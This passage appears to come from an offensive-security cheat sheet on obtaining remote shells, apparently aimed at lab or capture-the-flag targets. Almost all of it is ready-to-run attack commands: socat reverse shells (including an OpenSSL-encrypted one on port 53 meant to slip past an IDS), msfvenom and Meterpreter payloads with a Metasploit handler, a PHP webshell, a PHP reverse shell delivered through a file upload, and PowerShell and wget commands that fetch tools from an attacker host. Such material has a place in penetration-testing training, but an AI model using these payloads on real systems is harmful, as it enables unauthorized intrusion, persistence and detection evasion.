  ```bash
  # Listener
  socat TCP-L:443 -
  # Target (Linux)
  socat TCP:10.10.10.5:443 EXEC:"bash -li"
  ```
- **Stable TTY**:
  ```bash
  # Listener
  socat TCP-L:443 FILE:`tty`,raw,echo=0
  # Target
  socat TCP:10.10.10.5:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
  ```
- **Encrypted**:
  ```bash
  # Cert
  openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
  cat shell.key shell.crt > shell.pem
  # Listener
  socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
  # Target
  socat OPENSSL:10.10.10.5:443,verify=0 EXEC:"bash -li"
  ```

### Msfvenom
- **Stageless**:
  ```bash
  msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
  ```
- **Staged Meterpreter**:
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.5 LPORT=443
  ```

### Metasploit
- **Multi/Handler**:
  ```bash
  msfconsole
  use multi/handler
  set PAYLOAD <payload>
  set LHOST 10.10.10.5
  set LPORT 443
  exploit -j
  sessions <number>
  ```

### Webshells
- **PHP**:
  ```php
  <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
  ```

---

## 10. Example Scenarios

### Scenario 1: Linux Webserver PHP Reverse Shell
- **Context**: File upload vulnerability on a Linux webserver.
- **Steps**:
  1. Edit `/usr/share/webshells/php/php-reverse-shell.php`:
     ```php
     $ip = '10.10.10.5';
     $port = 443;
     ```
  2. Listener:
     ```bash
     sudo nc -lvnp 443
     ```
  3. Upload and access: `http://target.com/uploads/rshell.php`.
  4. Stabilize:
     ```bash
     python3 -c 'import pty;pty.spawn("/bin/bash")'
     export TERM=xterm
     # Ctrl+Z
     stty raw -echo; fg
     ```

### Scenario 2: Windows Bind Shell
- **Context**: Command execution via a Windows webshell, inbound port 4444 open.
- **Steps**:
  1. Upload `nc.exe`:
     ```bash
     sudo python3 -m http.server 80
     # In webshell
     powershell -c "Invoke-WebRequest -Uri http://10.10.10.5/nc.exe -OutFile C:\Windows\Temp\nc.exe"
     ```
  2. Bind shell:
     ```bash
     C:\Windows\Temp\nc.exe -lvnp 4444 -e cmd.exe
     ```
  3. Connect:
     ```bash
     nc 10.10.10.100 4444
     ```

### Scenario 3: Stable Socat TTY Shell
- **Context**: Netcat shell on Linux, need interactive shell.
- **Steps**:
  1. Upload Socat:
     ```bash
     sudo python3 -m http.server 80
     # In shell
     wget 10.10.10.5/socat -O /tmp/socat; chmod +x /tmp/socat
     ```
  2. Listener:
     ```bash
     socat TCP-L:443 FILE:`tty`,raw,echo=0
     ```
  3. Connect:
     ```bash
     /tmp/socat TCP:10.10.10.5:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
     ```

### Scenario 4: Windows Meterpreter
- **Context**: RDP access to Windows, want Meterpreter.
- **Steps**:
  1. Generate:
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.5 LPORT=443
     ```
  2. Listener:
     ```bash
     msfconsole
     use multi/handler
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
     set LHOST 10.10.10.5
     set LPORT 443
     exploit -j
     ```
  3. Upload and run `shell.exe` via RDP.

### Scenario 5: Encrypted Socat Shell
- **Context**: Linux target with IDS.
- **Steps**:
  1. Generate cert:
     ```bash
     openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
     cat shell.key shell.crt > shell.pem
     ```
  2. Listener:
     ```bash
     socat OPENSSL-LISTEN:53,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
     ```
  3. Connect:
     ```bash
     socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
     ```

---

